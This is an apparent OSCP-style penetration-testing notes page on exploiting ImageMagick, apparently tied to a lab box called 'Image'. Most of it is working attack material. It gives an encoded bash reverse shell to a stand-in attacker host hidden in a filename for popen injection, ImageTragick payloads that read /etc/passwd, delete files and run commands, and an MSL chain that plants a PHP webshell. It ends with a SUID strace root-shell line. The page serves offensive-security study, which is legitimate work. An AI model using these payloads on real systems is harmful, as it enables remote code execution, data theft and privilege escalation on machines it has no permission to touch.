---
title: "ImageMagick"
slug: imagemagick
category: notes
handbook: oscp
tags: ["file-upload", "exploit-development"]
draft: false
pubDatetime: 2026-08-07T21:57:33+03:00
modDatetime: 2026-09-13T19:53:02+03:00
description: "ImageMagick picks a coder from a file's contents, not its extension, and it shells out in more places than decoding pixels."
---
ImageMagick picks a coder from a file's contents, not its extension, and it shells out in more places than decoding pixels. That has produced several unrelated RCE bugs, and which one applies is decided almost entirely by the version. It fires anywhere `convert`, `identify`, or `mogrify` touches an attacker-supplied file, so it sits on both sides of a box like [ExifTool DjVu Injection](/collections/oscp/exiftool-djvu-injection):

- A web app that resizes, thumbnails, identifies, or strips metadata on upload runs the payload as the web user. Foothold.
- A cron job that sweeps an uploads directory with ImageMagick runs it as root. [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

Getting the file accepted and knowing where it lands is [File Upload](/collections/oscp/file-upload).

## Confirm the Version and Pick the Bug

```bash
convert --version        # or identify --version
```

Two different bug classes, split by version:

- **Before 6.9.3-10 / 7.0.1-1**: the ImageTragick coder abuses (MVG/MSL/url delegate). Content-based. Often blocked by policy.xml even on a vulnerable version, so check that too.
- **6.9.3-10 and later, built with pipe support**: CVE-2016-5118 / CVE-2023-34152 filename `popen` injection. The RCE is in the filename, not the file contents, and policy.xml does not touch it.

policy.xml gates the coder abuses specifically:

```bash
grep -iE 'MSL|MVG|EPHEMERAL|URL|HTTPS|TEXT|LABEL' /etc/ImageMagick-*/policy.xml
```

A `rights="none"` line for a coder means that abuse is dead regardless of version. The Image box runs 6.9.6-4, where the ImageTragick coders are patched, so the filename `popen` injection below is the live path.

## Filename popen Injection (CVE-2016-5118, CVE-2023-34152)

`OpenBlob` runs a filename through `popen` when it starts with `|`, so everything after the pipe is a shell command. The later `--enable-pipes` fix calls `SanitizeString` first, but that only strips single quotes, leaving backticks and double quotes to inject with. The whole payload lives in the filename, so nothing about the file contents matters.

The one constraint is that the name has to be a legal filename, and `/` is a path separator. A reverse shell is full of slashes (`/dev/tcp/...`), so base64 the command and hide the slashes inside the encoding:

```bash
echo -n 'bash -i >& /dev/tcp/KALI/443 0>&1' | base64 -w0
```

Then name a file so ImageMagick pipes it into a shell that decodes and runs it:

```bash
cp cat.png '|en"`echo <BASE64> | base64 -d | bash`".png'
```

`|` starts the `popen`, `en` is throwaway filler for the first word, the double-quoted `` `...` `` is the command substitution that runs the payload, `.png` is trailing. The `| bash` forces bash regardless of the target's `/bin/sh`.

Upload that file to the application and catch the shell:

```bash
nc -lvnp 443
```

The app runs `identify`/`convert` on the client-supplied filename, which is what fires the pipe, so the file is named as the injection and its bytes are only a placeholder. A properly named file does nothing, there is no pipe to trigger the `popen`. Make the placeholder a real image (`convert -size 32x32 xc:red cat.png`) rather than an empty file, since the app may reject a non-image before the name ever reaches ImageMagick. If the browser mangles the special characters, set the filename directly in the multipart `Content-Disposition` with Burp ([Burp Suite](/collections/oscp/burp-suite)).

### The base64 Slash Trap

If the base64 output contains a `/`, `cp` cannot create the file, because that `/` is read as a directory. Re-encode after changing the port or appending a trailing `#`, or switch to base32, whose alphabet has no `/`:

```bash
echo -n 'bash -i >& /dev/tcp/KALI/443 0>&1' | base32 -w0
# filename then uses:  `echo <BASE32> | base32 -d | bash`
```

`base32`/`base64` are coreutils and normally present on the target.

There is also a public PoC (SudoIndividual/CVE-2023-34152) that generates the malicious file with the name starting `|en`. Doing it by hand is faster once the quoting is understood, and it makes the base64 slash trap visible instead of silent.

## Coder Abuse (ImageTragick, CVE-2016-371x)

For versions before 6.9.3-10 / 7.0.1-1 with a permissive policy. Each abuse is delivered inside an MVG (or SVG) that ImageMagick renders. The wrapper is always the same, only the middle line changes:

```text
push graphic-context
viewbox 0 0 640 480
<the abuse line>
pop graphic-context
```

- `label:@` reads a file into the rendered output image (CVE-2016-3717): `image over 0,0 0,0 'label:@/etc/passwd'`
- `ephemeral:` deletes a file after reading it (CVE-2016-3715): `image over 0,0 0,0 'ephemeral:/var/www/html/lock'`
- the `url`/`https` delegate gives command execution (CVE-2016-3714): `fill 'url(https://127.0.0.1/x.jpg"|id")'`, dead when that delegate is disabled
- `msl:` runs an MSL script whose `read`/`write` directives give an arbitrary file write, so a webshell (CVE-2016-3716)

### Webshell via the MSL Coder

Three files, all uploaded through the same image feature: an image carrying PHP, an MSL script that copies it to a web-served path with a PHP extension, and an MVG that triggers the MSL script.

MSL `<read>` decodes the image and `<write>` re-encodes it, so PHP appended after the image data is stripped. Carry it in a **GIF comment** instead, which is stored as metadata and survives the round-trip:

```bash
convert -size 8x8 xc:white -set comment '<?php system($_GET["cmd"]); ?>' image.gif
```

`script.msl`, with `gif:` forcing the output format so the `.php` extension does not confuse the encoder:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="/tmp/image.gif" />
  <write filename="gif:/var/www/html/uploads/shell.php" />
</image>
```

The trigger MVG, uploaded and processed like any image:

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/script.msl'
pop graphic-context
```

`/tmp/image.gif` and `/tmp/script.msl` are the real stored paths of the first two uploads, so pin them down from the upload response first ([File Upload](/collections/oscp/file-upload)). The write directory has to be both writable by the convert user and web-served. Then:

```bash
curl 'http://TARGET/uploads/shell.php?cmd=id'
```

## Related

- [ExifTool DjVu Injection](/collections/oscp/exiftool-djvu-injection) is the same shape, attacker data reaching an interpreter through an image tool, and shares the identify-by-content property that gets a file past filters.
- [File Upload](/collections/oscp/file-upload) for finding where uploads land and getting past filters, [Webshells](/collections/oscp/webshells) for the payload, [Reverse Shells](/collections/oscp/reverse-shells) for the callback.
- [SUID Binaries](/collections/oscp/suid-binaries) for the privesc side. On Image the foothold user then has SUID `strace`, GTFOBins `strace -o /dev/null /bin/sh -p`.
